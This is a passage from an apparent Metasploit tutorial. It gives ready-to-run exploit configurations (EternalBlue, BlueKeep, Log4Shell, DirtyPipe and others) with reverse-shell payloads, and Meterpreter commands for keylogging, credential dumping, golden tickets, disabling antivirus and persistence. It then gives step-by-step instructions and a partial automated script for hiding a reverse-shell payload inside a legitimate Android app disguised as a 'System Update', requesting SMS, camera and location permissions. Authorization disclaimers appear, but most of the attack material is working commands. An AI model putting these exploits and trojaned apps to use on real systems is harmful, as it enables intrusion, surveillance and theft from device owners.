use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.1.0/24
run

# RDP
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 192.168.1.0/24
run

# VNC
use auxiliary/scanner/vnc/vnc_none_auth
set RHOSTS 192.168.1.0/24
run

# ==========================================
#       VULNERABILITY SCANNERS
# ==========================================

# SMB vulnerabilities
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Heartbleed
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.1.20
set RPORT 443
run

# EternalBlue check
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.20
check

# ==========================================
#       NMAP INTEGRATION
# ==========================================

# Run Nmap from msfconsole
db_nmap -sV -sC -O -A 192.168.1.0/24
db_nmap -sV -p- 192.168.1.20  # All ports
db_nmap --script vuln 192.168.1.20
db_nmap -sU 192.168.1.20  # UDP scan

# Import Nmap results
db_import /tmp/nmap_scan.xml

# View hosts
hosts

# View services
services

# View vulnerabilities
vulns
```

### 6.3 Common Exploits

```bash
# ==========================================
#       WINDOWS EXPLOITS
# ==========================================

# EternalBlue (MS17-010) - Windows SMB
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
exploit

# BlueKeep (CVE-2019-0708) - RDP
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set target 0  # Windows 7 SP1
exploit

# MS08-067 - Windows Server Service
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.1.20
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set target 0
exploit

# PrintNightmare (CVE-2021-34527)
use exploit/windows/dcerpc/cve_2021_34527_printnightmare
set RHOSTS 192.168.1.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       LINUX EXPLOITS
# ==========================================

# DirtyPipe (CVE-2022-0847) - Kernel privilege escalation
use exploit/linux/local/cve_2022_0847_dirtypipe
set SESSION 1
set LHOST 192.168.1.10
exploit

# Sudo Baron Samedit (CVE-2021-3156)
use exploit/linux/local/sudo_baron_edit
set SESSION 1
set LHOST 192.168.1.10
exploit

# DirtyCow (CVE-2016-5195)
use exploit/linux/local/dcow
set SESSION 1
set LHOST 192.168.1.10
exploit

# ==========================================
#       MULTI-PLATFORM EXPLOITS
# ==========================================

# Java RMI Server
use exploit/multi/misc/java_rmi_server
set RHOSTS 192.168.1.20
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# Apache Struts
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS 192.168.1.20
set RPORT 8080
set TARGETURI /struts2-showcase/
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# Log4Shell (CVE-2021-44228)
use exploit/multi/http/log4shell_header_injection
set RHOSTS 192.168.1.20
set RPORT 8080
set TARGETURI /
set HTTP_HEADER X-Api-Version
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# ==========================================
#       ANDROID EXPLOITS
# ==========================================

# Stagefright (CVE-2015-6616)
use exploit/android/browser/stagefright_mp4_tx3g_64bit
set SRVHOST 192.168.1.10
set URIPATH /video
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# Android ADB Debuggable
use exploit/android/adb/adb_debuggable
set RHOSTS 192.168.1.0/24
set PAYLOAD android/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit
```

---

## 7. Payloads Deep Dive

### 7.1 Payload Architecture

```
PAYLOAD TYPES:
│
├── SINGLES (Self-contained)
│   ├── Complete payload in one piece
│   ├── No external dependencies
│   ├── Larger size
│   └── Examples:
│       ├── windows/shell_reverse_tcp
│       ├── linux/x86/meterpreter_reverse_tcp
│       └── android/meterpreter/reverse_tcp
│
├── STAGERS (Connection initiators)
│   ├── Small, establish connection
│   ├── Download and execute stage
│   ├── Smaller size, more reliable
│   └── Examples:
│       ├── windows/meterpreter/reverse_tcp
│       ├── generic/shell_reverse_tcp
│       └── android/meterpreter/reverse_tcp
│
├── STAGES (Larger payloads)
│   ├── Downloaded by stager
│   ├── Full payload functionality
│   ├── Not size-constrained
│   └── Examples:
│       ├── meterpreter
│       ├── shell
│       └── vncinject
│
└── ADAPTERS (Wrappers)
    ├── Wrap payloads for different delivery
    └── Examples:
        ├── cmd/windows/powershell
        └── cmd/unix/python
```

### 7.2 Payload Naming Convention

```
FORMAT: <platform>/<arch>/<type>[_<convention>]

Platform:    windows, linux, osx, android, java, php, python, ruby, multi
Architecture: x86, x64, armle, armbe, mipsbe, mipsle, ppc, sparc
Type:        shell, meterpreter, vncinject, shell_reverse_tcp
Convention:  
  - reverse_tcp  → Staged reverse TCP shell
  - reverse_http → Staged reverse HTTP
  - bind_tcp     → Staged bind TCP shell
  - _reverse_tcp → Single reverse TCP shell (note underscore prefix)
  - _bind_tcp    → Single bind TCP shell

Examples:
├── windows/x64/meterpreter/reverse_tcp        # Staged Meterpreter (reverse)
├── windows/x64/meterpreter_reverse_tcp        # Single Meterpreter (reverse)
├── windows/meterpreter/bind_tcp               # Staged Meterpreter (bind)
├── windows/shell/reverse_tcp                  # Staged shell (reverse)
├── windows/shell_reverse_tcp                  # Single shell (reverse)
├── linux/x86/meterpreter/reverse_tcp          # Linux Meterpreter
├── linux/x64/shell/reverse_tcp                # Linux shell
├── android/meterpreter/reverse_tcp            # Android Meterpreter
├── java/meterpreter/reverse_tcp               # Java Meterpreter
├── php/meterpreter/reverse_tcp                # PHP Meterpreter
├── python/meterpreter/reverse_tcp             # Python Meterpreter
├── cmd/unix/reverse_bash                      # Bash reverse shell
└── generic/shell_reverse_tcp                  # Generic shell
```

### 7.3 Common Payloads by Platform

```bash
# ==========================================
#       WINDOWS PAYLOADS
# ==========================================

# Meterpreter (staged, reverse) - MOST COMMON
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_tcp

# Meterpreter (staged, bind)
windows/x64/meterpreter/bind_tcp

# Meterpreter (staged, HTTP/HTTPS)
windows/x64/meterpreter/reverse_http
windows/x64/meterpreter/reverse_https

# Meterpreter (single, no stager)
windows/x64/meterpreter_reverse_tcp
windows/x64/meterpreter_reverse_http

# Shell (reverse)
windows/x64/shell/reverse_tcp
windows/shell/reverse_tcp

# Shell (bind)
windows/x64/shell/bind_tcp

# VNC (remote desktop)
windows/x64/vncinject/reverse_tcp

# PowerShell
windows/x64/meterpreter/reverse_tcp  # Often staged through PowerShell

# ==========================================
#       LINUX PAYLOADS
# ==========================================

# Meterpreter
linux/x64/meterpreter/reverse_tcp
linux/x86/meterpreter/reverse_tcp
linux/armle/meterpreter/reverse_tcp   # ARM (IoT, Raspberry Pi)

# Shell
linux/x64/shell/reverse_tcp
linux/x86/shell/reverse_tcp

# ==========================================
#       ANDROID PAYLOADS
# ==========================================

# Meterpreter (reverse TCP)
android/meterpreter/reverse_tcp

# Meterpreter (reverse HTTP/HTTPS)
android/meterpreter/reverse_http
android/meterpreter/reverse_https

# Shell
android/shell/reverse_tcp

# ==========================================
#       MULTI-PLATFORM PAYLOADS
# ==========================================

# Java (works on any JVM)
java/meterpreter/reverse_tcp
java/shell/reverse_tcp
java/shell_reverse_tcp

# Python (cross-platform)
python/meterpreter/reverse_tcp
python/meterpreter_reverse_tcp

# PHP (web servers)
php/meterpreter/reverse_tcp
php/meterpreter_reverse_tcp
php/reverse_php

# Ruby
ruby/shell_reverse_tcp

# ==========================================
#       SHELL COMMAND PAYLOADS
# ==========================================

# Bash
cmd/unix/reverse_bash
cmd/unix/reverse_bash_tcp

# Python
cmd/unix/reverse_python
cmd/unix/reverse_python_ssl

# Netcat
cmd/unix/reverse_netcat

# Perl
cmd/unix/reverse_perl

# PowerShell
cmd/windows/reverse_powershell

# ==========================================
#       SHELLCODE (Raw)
# ==========================================

# Generate raw shellcode
# Use msfvenom -f raw (see msfvenom section)
```

### 7.4 Staged vs. Stageless vs. Singles

```
┌──────────────────────────────────────────────────────────────────┐
│                    STAGED PAYLOADS                                │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│  Victim                    Attacker                               │
│    │                          │                                   │
│    │  ┌──── Stager ────┐      │                                   │
│    │──┼──Connect────────┼──────│  ← Small stager connects         │
│    │  └────────────────┘      │                                   │
│    │                          │                                   │
│    │  ┌──── Request ───┐      │                                   │
│    │──┼──Stage Request──┼──────│  ← Request larger stage          │
│    │  └────────────────┘      │                                   │
│    │                          │                                   │
│    │  ┌──── Stage ─────┐      │                                   │
│    │←─┼──Stage Sent─────┼──────│  ← Stage sent in chunks          │
│    │  └────────────────┘      │                                   │
│    │                          │                                   │
│    │  ┌──── Execute ───┐      │                                   │
│    │──┼──Meterpreter───┼──────│  ← Full session established       │
│    │  └────────────────┘      │                                   │
│                                                                   │
│  Pros: Smaller initial payload, more reliable                     │
│  Cons: Requires stable connection, multiple packets               │
│  Names: .../meterpreter/reverse_tcp                               │
│                                                                   │
└──────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────┐
│                    STAGELESS (SINGLES) PAYLOADS                   │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│  Victim                    Attacker                               │
│    │                          │                                   │
│    │  ┌──── Complete ───┐      │                                   │
│    │──┼──All-in-one─────┼──────│  ← Single large payload           │
│    │  └────────────────┘      │                                   │
│    │                          │                                   │
│    │  ┌──── Execute ───┐      │                                   │
│    │──┼──Meterpreter───┼──────│  ← Full session established       │
│    │  └────────────────┘      │                                   │
│                                                                   │
│  Pros: Single packet, no stage negotiation, works in more cases   │
│  Cons: Larger size, easier to detect                              │
│  Names: .../meterpreter_reverse_tcp (note underscore)             │
│                                                                   │
└──────────────────────────────────────────────────────────────────┘

WHEN TO USE WHICH:
├── Use STAGED when:
│   ├── Size is a constraint (buffer overflows)
│   ├── Reliable connection expected
│   ├── Want to use stage encoding
│   └── Default recommended choice
│
└── Use STAGELESS when:
    ├── Unstable connection
    ├── Need to avoid multiple connections
    ├── Firewalls block stage negotiation
    └── One-shot scenarios
```

---

## 8. Meterpreter Deep Dive

### 8.1 What is Meterpreter?

Meterpreter (Meta-Interpreter) is Metasploit's flagship payload. It operates entirely in memory, provides a rich command set, and offers extensible architecture.

```
METERPRETER FEATURES:
├── In-Memory Execution
│   ├── Never touches disk (fileless)
│   ├── Injects into running processes
│   └── Anti-forensic by design
│
├── Communication
│   ├── Encrypted communication (AES-256)
│   ├── Multiple transport protocols (TCP, HTTP, HTTPS)
│   ├── Session migration
│   └── Transport switching
│
├── Command Interface
│   ├── 200+ built-in commands
│   ├── Ruby API access
│   ├── Extension loading
│   └── Script execution
│
├── Core Capabilities
│   ├── File system operations
│   ├── Process management
│   ├── Network operations
│   ├── System information
│   ├── User interface (screenshots, keylogging)
│   ├── Privilege escalation
│   ├── Credential harvesting
│   └── Pivoting
│
└── Extensions
    ├── stdapi    - Standard API
    ├── priv      - Privilege escalation
    ├── kiwi      - Mimikatz integration
    ├── incognito  - Token manipulation
    ├── sniffer   - Packet capture
    ├── lanattacks - DHCP/TFTP attacks
    ├── powershell - PowerShell integration
    ├── python    - Python integration
    └── unicorn   - Memory injection
```

### 8.2 Core Commands

```bash
# ==========================================
#       CORE METERPRETER COMMANDS
# ==========================================

# Session information
getuid                  # Current user ID
getpid                  # Current process ID
getprivs                # Current privileges
sysinfo                 # System information
pgrep <process>         # Find process ID by name

# Background and exit
background              # Background current session
bg                      # Alias for background
exit                    # Close session
quit                    # Close session

# Help
help                    # Show all commands
help <category>         # Category help

# ==========================================
#       FILE SYSTEM COMMANDS
# ==========================================

# Navigation
pwd                     # Print working directory
cd <path>               # Change directory
ls                      # List files
dir                     # List files (Windows)

# File operations
cat <file>              # Display file content
download <remote> [local]  # Download file
upload <local> [remote]    # Upload file
edit <file>             # Edit file (vim)
mkdir <dir>             # Create directory
rmdir <dir>             # Remove directory
rm <file>               # Delete file
mv <src> <dst>          # Move file
cp <src> <dst>          # Copy file
search -f <pattern>     # Search for files
checksum <file>         # File checksum

# File interaction
show_mount              # Show mounted drives
stat <file>             # File statistics
getlwd                  # Local working directory
lcd <path>              # Local change directory

# ==========================================
#       PROCESS COMMANDS
# ==========================================

ps                      # List processes
pgrep <name>            # Find process by name
getpid                  # Current process ID
migrate <pid>           # Migrate to process
kill <pid>              # Kill process
execute -f <cmd>        # Execute command
execute -H -f <cmd>     # Execute hidden
execute -f <cmd> -i     # Execute interactively

# Process migration
migrate -N <process>    # Migrate by name
migrate -k              # Kill original process after migrate

# ==========================================
#       NETWORK COMMANDS
# ==========================================

ifconfig                # Network interfaces (also ipconfig)
netstat                 # Network connections
arp                     # ARP table
route                   # Routing table
portfwd add -l <local> -p <remote> -r <host>  # Port forwarding
portfwd list            # List port forwards
portfwd delete -l <local> -p <remote> -r <host>
portfwd flush            # Remove all forwards
resolve <hostname>      # DNS resolution

# ==========================================
#       SYSTEM COMMANDS
# ==========================================

shell                   # Drop to system shell
execute -f cmd.exe -i -H  # Interactive hidden shell
getsystem               # Attempt privilege escalation
getprivs                # List available privileges
pgrep <process>         # Find process ID
reboot                  # Reboot system
shutdown                # Shutdown system

# ==========================================
#       USER INTERFACE
# ==========================================

screenshot              # Take screenshot
screenshare             # Live screen sharing
keyscan_start           # Start keylogger
keyscan_stop            # Stop keylogger
keyscan_dump            # Dump captured keys
idletime                # User idle time
uictl enable keyboard   # Enable keyboard
uictl disable keyboard  # Disable keyboard
enumdesktops            # List desktops
getdesktop              # Get current desktop
setdesktop <id>         # Switch desktop

# ==========================================
#       CREDENTIAL COMMANDS
# ==========================================

hashdump                # Dump SAM hashes (Windows)
lsa_dump_sam            # Dump SAM database
lsa_dump_secrets        # Dump LSA secrets
cachedump               # Dump cached credentials
wifi_list               # List WiFi profiles (Windows)
wifi_disconnect         # Disconnect from WiFi

# ==========================================
#       PRIVILEGE ESCALATION
# ==========================================

getsystem               # Multiple techniques
getsystem -t 1          # Named pipe impersonation
getsystem -t 2          # Named pipe impersonation (2)
getsystem -t 3          # Token duplication

# ==========================================
#       PIVOTING COMMANDS
# ==========================================

portfwd add -l 3389 -p 3389 -r 10.10.10.5  # RDP pivot
portfwd add -L 0.0.0.0 -l 8080 -p 80 -r 10.10.10.5  # HTTP pivot
autoroute -s 10.10.10.0/24  # Add route through session
autoroute -p                # Print routes
```

### 8.3 Extensions

```bash
# ==========================================
#       METERPRETER EXTENSIONS
# ==========================================

# List loaded extensions
load

# Load extension
load kiwi              # Mimikatz (Windows)
load incognito          # Token manipulation
load sniffer            # Packet capture
load powershell         # PowerShell
load python             # Python
load lanattacks         # DHCP/TFTP
load extapi             # Extended API
load unhook             # Unhooking

# After loading kiwi (Mimikatz)
creds_all               # All credentials
creds_msv               # MSV credentials
creds_kerberos          # Kerberos credentials
creds_wdigest           # WDigest credentials
creds_ssp               # SSP credentials
creds_tspkg             # TSPKG credentials
dcsync                  # DCSync attack
dcsync_ntlm             # DCSync NTLM hash
golden_ticket_create    # Create golden ticket
kerberos_ticket_use     # Use Kerberos ticket
kerberos_ticket_purge   # Purge tickets
kerberos_ticket_list    # List tickets
lsa_dump_sam            # Dump SAM
lsa_dump_secrets        # Dump secrets
wifi_list               # WiFi passwords

# After loading incognito
list_tokens -u          # List user tokens
list_tokens -g          # List group tokens
impersonate_token <token>  # Impersonate token
sniff_keys              # Sniff encryption keys

# After loading sniffer
sniffer_interfaces      # List interfaces
sniffer_start <id>      # Start capture
sniffer_stop <id>       # Stop capture
sniffer_stats <id>      # Statistics
sniffer_dump <id>       # Dump packets
sniffer_release <id>    # Release buffer

# After loading powershell
powershell_execute "<code>"  # Execute PowerShell
powershell_import <file>     # Import script
powershell_shell             # PowerShell interactive shell
```

### 8.4 Meterpreter Scripts (Legacy)

```bash
# These are legacy scripts; modern approach is post modules
# But still useful to know

# Run a script
run <script_name>

# Common scripts
run checkvm                  # Check if in VM
run get_local_subnets        # Get local networks
run getcountermeasure        # List security software
run hostsedit                # Modify hosts file
run killav                   # Kill antivirus
run metsvc                   # Install Meterpreter service
run migrate                  # Auto-migrate
run persistence              # Install persistent backdoor
run post/windows/gather/enum_applications  # List installed apps
run post/windows/gather/enum_logged_on_users  # Logged-in users
run post/multi/gather/firefox_creds  # Firefox credentials
run scraper                  # Full system scrape
run winenum                  # Windows enumeration
```

### 8.5 Session Migration and Transport

```bash
# Migrate to a stable process
migrate -N explorer.exe     # Migrate to Explorer
migrate 1234                # Migrate to PID 1234

# Check migration status
getpid

# Transport list
transport list              # List available transports

# Add transport
transport add -t reverse_tcp -l 192.168.1.10 -p 5555
transport add -t reverse_http -l 192.168.1.10 -p 8080 -u /path
transport add -t reverse_https -l 192.168.1.10 -p 443

# Switch transport
transport next              # Switch to next transport

# Remove transport
transport remove -t reverse_tcp -l 192.168.1.10 -p 5555

# Session timeouts
session_expiry              # Check/set expiry
session_expiry -s 86400     # Set to 24 hours
```

---

## 9. Ethical APK Embedding

### 9.1 Understanding APK Payload Embedding

> **ETHICAL USE ONLY**: APK payload embedding is used in authorized penetration testing to demonstrate the risk of installing untrusted applications. This technique is used to:
> - Test mobile device security policies (MDM/MAM)
> - Assess employee security awareness
> - Demonstrate risks during security training
> - Evaluate mobile application security controls
> - Conduct authorized red team exercises
>
> **NEVER** use these techniques without explicit written authorization.

### 9.2 How APK Embedding Works

```
APK EMBEDDING PROCESS:

┌─────────────────────────────────────────────────────────────────┐
│                                                                  │
│  Original APK          Payload Code         Embedded APK         │
│  ┌──────────┐          ┌──────────┐        ┌──────────────┐     │
│  │ Original │          │ Payload  │        │  Original    │     │
│  │   Code   │    +     │  Code    │   =    │    Code      │     │
│  │          │          │ (Binder  │        │  + Payload   │     │
│  │ Original │          │ Activity)│        │    Activity  │     │
│  │ Manifest │          │          │        │              │     │
│  │          │          │ Reverse  │        │  Original    │     │
│  │ Original │          │  Shell   │        │  Functionality│     │
│  │Resources │          │          │        │  (unchanged) │     │
│  └──────────┘          └──────────┘        └──────────────┘     │
│                                                                  │
│  PROCESS:                                                        │
│  1. Decompile original APK (Apktool)                             │
│  2. Generate payload code (msfvenom)                             │
│  3. Inject payload into decompiled source                         │
│  4. Modify AndroidManifest.xml                                   │
│  5. Rebuild APK (Apktool)                                        │
│  6. Sign APK (jarsigner/apksigner)                               │
│  7. Install on target (with authorization)                       │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### 9.3 Method 1: Using Msfvenom Direct Payload

This is the simplest method - generating a standalone payload APK.

```bash
# ==========================================
#  GENERATING STANDALONE ANDROID PAYLOAD
# ==========================================

# Basic Android Meterpreter payload
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -o payload.apk

# With custom permissions and app name
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    --app-name "System Update" \
    --app-icon /path/to/icon.png \
    -o system_update.apk

# Android Meterpreter via HTTPS (encrypted)
msfvenom -p android/meterpreter/reverse_https \
    LHOST=192.168.1.10 \
    LPORT=443 \
    --app-name "Security Patch" \
    -o security_patch.apk

# List all Android payloads
msfvenom -l payloads | grep android
```

### 9.4 Method 2: Embedding Payload into Legitimate APK

This method embeds the Meterpreter payload into a legitimate APK, maintaining the original app's functionality.

```bash
# ==========================================
#  STEP-BY-STEP APK PAYLOAD INJECTION
# ==========================================

# PREREQUISITES:
# - Metasploit Framework
# - Apktool
# - Java JDK (keytool, jarsigner)
# - zipalign (Android SDK)
# - Android SDK or ADB
# - Written authorization from the app owner/client

# ==========================================
# STEP 1: Prepare the Environment
# ==========================================

# Create working directory
mkdir -p ~/pentest/apk_embed && cd ~/pentest/apk_embed

# Copy the target APK
cp /path/to/target_app.apk ./original_app.apk

# Verify the APK
keytool -printcert -jarfile original_app.apk

# ==========================================
# STEP 2: Decompile the Original APK
# ==========================================

# Decompile with Apktool
apktool d original_app.apk -o decompiled_app

# Verify decompilation
ls decompiled_app/
# Should see: AndroidManifest.xml, smali/, res/, assets/, etc.

# Read the manifest to understand the app structure
cat decompiled_app/AndroidManifest.xml

# ==========================================
# STEP 3: Generate the Payload
# ==========================================

# Generate Android Meterpreter payload
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f raw \
    -o payload.dex

# OR generate as APK for separate injection
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.10 \
    LPORT=4444 \
    -f apk \
    -o standalone_payload.apk

# ==========================================
# STEP 4: Inject Payload into Decompiled App
# ==========================================

# 4a. Decompile the payload APK
apktool d standalone_payload.apk -o payload_decompiled

# 4b. Copy payload Smali code to target app
# Find the main payload activity class
find payload_decompiled/smali -name "*.smali" | head -20

# The payload class is usually in:
# payload_decompiled/smali/com/metasploit/stage/

# Copy payload smali to target app
cp -r payload_decompiled/smali/com/metasploit \
      decompiled_app/smali/com/

# 4c. Modify the target app's AndroidManifest.xml
# Add the payload activity and permissions

# ==========================================
# STEP 5: Modify AndroidManifest.xml
# ==========================================

# Open decompiled_app/AndroidManifest.xml and add:

# 5a. Add required permissions (if not present)
# Add before <application> tag:

```

```xml
<!-- Add these permissions to AndroidManifest.xml -->
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.SEND_SMS" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.WAKE_LOCK" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
```

```bash
# ==========================================
# STEP 6: Inject the Payload Activity
# ==========================================

# 6a. Find the main launcher activity in AndroidManifest.xml
grep -A 10 "category.LAUNCHER" decompiled_app/AndroidManifest.xml
# Note the activity name, e.g., com.example.app.MainActivity

# 6b. Edit the launcher activity's Smali file
# Find the onCreate method of the main activity
MAIN_ACTIVITY=$(grep -B 20 "category.LAUNCHER" decompiled_app/AndroidManifest.xml | grep "android:name" | head -1 | sed 's/.*android:name="//' | sed 's/".*//')
echo "Main Activity: $MAIN_ACTIVITY"

# Convert dots to slashes for Smali path
SMALI_PATH=$(echo $MAIN_ACTIVITY | sed 's/\./\//g')
SMALI_FILE="decompiled_app/smali/${SMALI_PATH}.smali"

# 6c. Add payload invocation in onCreate method
# Find .method public onCreate in the Smali file
# Add the following after "invoke-super" line:

```

```smali
# Add this to the onCreate method of the main activity
# After: invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

# Start the payload
invoke-static {}, Lcom/metasploit/stage/MainService;->start()V

# OR for the Payload activity:
# new-instance v0, Landroid/content/Intent;
# invoke-direct {v0}, Landroid/content/Intent;-><init>()V
# const-class v1, Lcom/metasploit/stage/Payload;
# invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;
# invoke-virtual {p0, v0}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
```

```bash
# ==========================================
# STEP 7: Rebuild the APK
# ==========================================

# Rebuild with Apktool
apktool b decompiled_app/ -o modified_app.apk

# Verify build was successful
ls -la modified_app.apk

# ==========================================
# STEP 8: Align the APK
# ==========================================

# Zipalign (required for proper installation)
zipalign -v 4 modified_app.apk aligned_app.apk

# ==========================================
# STEP 9: Generate Signing Key
# ==========================================

# Create a signing keystore
keytool -genkeypair -v \
    -keystore my-signing-key.jks \
    -keyalg RSA \
    -keysize 2048 \
    -validity 10000 \
    -alias my-alias \
    -storepass password123 \
    -keypass password123 \
    -dname "CN=Security Testing, OU=Pentest, O=Your Company, L=City, S=State, C=US"

# ==========================================
# STEP 10: Sign the APK
# ==========================================

# Sign using apksigner (recommended)
apksigner sign \
    --ks my-signing-key.jks \
    --ks-key-alias my-alias \
    --ks-pass pass:password123 \
    --key-pass pass:password123 \
    --out signed_app.apk \
    aligned_app.apk

# OR sign using jarsigner (legacy)
jarsigner -verbose \
    -sigalg SHA1withRSA \
    -digestalg SHA1 \
    -keystore my-signing-key.jks \
    -storepass password123 \
    -keypass password123 \
    aligned_app.apk \
    my-alias

# Verify signature
apksigner verify signed_app.apk

# Check signature details
apksigner verify --print-certs signed_app.apk

# ==========================================
# STEP 11: Install on Target (with authorization)
# ==========================================

# Install via ADB
adb install signed_app.apk

# OR if replacing existing app
adb install -r signed_app.apk

# OR transfer to device and install manually
```

### 9.5 Method 3: Automated APK Injection Script

```bash
#!/bin/bash
# apk_inject.sh - Automated APK Payload Injection
# Author: EFXTv
# For AUTHORIZED penetration testing only

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}"
echo "============================================"
echo "   APK Payload Injection Tool"
echo "   For Authorized Testing Only"
echo "   Author: EFXTv"
echo "============================================"
echo -e "${NC}"

# Check dependencies
check_dependencies() {
    echo -e "${YELLOW}[*] Checking dependencies...${NC}"
    
    local deps=("apktool" "msfvenom" "keytool" "jarsigner" "zipalign" "java")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${RED}[!] Missing: $dep${NC}"
            exit 1
        fi
    done
    echo -e "${GREEN}[+] All dependencies found${NC}"
}

# Verify authorization
verify_authorization() {
    echo -e "${YELLOW}"
    echo "╔════════════════════════════════════════════╗"
    echo "║       AUTHORIZATION VERIFICATION           ║"
    echo "╠════════════════════════════════════════════╣"
    echo "║  This tool injects payloads into APKs.     ║"
    echo "║  Only use on applications you OWN or have  ║"
    echo "║  WRITTEN AUTHORIZATION to test.            ║"
    echo "║                                            ║"
    echo "║  Unauthorized use is ILLEGAL and UNETHICAL.║"
    echo "╚════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    read -p "Do you have written authorization? (yes/no): " auth
    if [ "$auth" != "yes" ]; then
        echo -e "${RED}[!] Authorization required. Exiting.${NC}"
        exit 1
    fi
    
    read -p "Enter target/app identifier for logging: " target_id
    echo "[*] Target: $target_id - $(date)" >> ~/pentest/authorization.log
}

# Main function
main() {
    check_dependencies
    verify_authorization
    
    # Get inputs
    read -p "[?] Path to original APK: " ORIGINAL_APK
    if [ ! -f "$ORIGINAL_APK" ]; then
        echo -e "${RED}[!] APK file not found${NC}"
        exit 1
    fi
    
    read -p "[?] Listener IP (LHOST): " LHOST
    read -p "[?] Listener Port (LPORT): " LPORT
    LPORT=${LPORT:-4444}
    
    read -p "[?] App display name [Security Update]: " APP_NAME
    APP_NAME=${APP_NAME:-"Security Update"}
    
    # Create working directory
    WORK_DIR=$(mktemp -d)
    echo -e "${CYAN}[*] Working directory: $WORK_DIR${NC}"
    
    # Step 1: Decompile original
    echo -e "${YELLOW}[1/10] Decompiling original APK...${NC}"
    apktool d "$ORIGINAL_APK" -o "$WORK_DIR/original" -f 2>/dev/null
    if [ $? -ne 0 ]; then
        echo -e "${RED}[!] Decompilation failed${NC}"
        exit 1
    fi
    echo -e "${GREEN}[+] Decompilation successful${NC}"
    
    # Step 2: Generate payload
    echo -e "${YELLOW}[2/10] Generating payload...${NC}"
    msfvenom -p android/meterpreter/reverse_tcp \
        LHOST="$LHOST" \
        LPORT="$LPORT" \
        -f apk \
        -o "$WORK_DIR/payload.apk" 2>/dev/null
    echo -e "${GREEN}[+] Payload generated${NC}"
    
    # Step 3: Decompile payload
    echo -e "${YELLOW}[3/10] Decompiling payload...${NC}"
    apktool d "$WORK_DIR/payload.apk" -o "$WORK_DIR/payload" -f 2>/dev/null
    
    # Step 4: Copy payload code
    echo -e "${YELLOW}[4/10] Injecting payload code...${NC}"
    mkdir -p "$WORK_DIR/original/smali/com/metasploit"
    cp -r "$WORK_DIR/payload/smali/com/metasploit/"* \
          "$WORK_DIR/original/smali/com/metasploit/"
    
    # Step 5: Modify manifest
    echo -e "${YELLOW}[5/10] Modifying AndroidManifest.xml...${NC}"
    
    # Add permissions
    PERMISSIONS=(
        "android.permission.INTERNET"
        "android.permission.ACCESS_NETWORK_STATE"
        "android.permission.ACCESS_WIFI_STATE"
        "android.permission.READ_PHONE_STATE"
        "android.permission.WAKE_LOCK"
        "android.permission.RECEIVE_BOOT_COMPLETED"
    )
    
    for perm in "${PERMISSIONS[@]}"; do
        if ! grep -q "$perm" "$WORK_DIR/original/AndroidManifest.xml"; then
            sed -i "/<application/i\\    <uses-permission android:name=\"$perm\" />" \
                "$WORK_DIR/original/AndroidManifest.xml"
        fi
    done
    
    # Add payload activity
    if ! grep -q "com.metasploit.stage.Payload" "$WORK_DIR/original/AndroidManifest.xml"; then
        sed -i '/<\/application>/i\\        <activity android:name="com.metasploit.stage.Payload" android:exported="true" />' \
            "$WORK_DIR/original/AndroidManifest.xml"
    fi
    
    echo -e "${GREEN}[+] Manifest modified${NC}"
    
    # Step 6: Rebuild
